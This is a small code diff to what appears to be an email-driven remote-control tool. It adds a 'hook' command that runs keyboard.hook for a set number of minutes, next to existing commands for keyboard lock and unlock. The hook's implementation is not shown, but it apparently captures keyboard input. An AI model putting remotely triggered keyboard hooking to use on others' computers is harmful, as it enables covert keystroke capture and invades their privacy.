@@ -27,6 +27,12 @@ def listen(msg,email):
                 keyboard.unlock()
             elif "state" == string[2]:
                 keyboard.notificationState()
+            elif "hook" == string[2]:
+                if string[-1] == "hook":
+                    number = 1
+                else:
+                    number = int(string[-1])
+                keyboard.hook(minute = number)
 
         if "system" == string[1]:
             system = ManagerSystem.ManagerSystem(email)
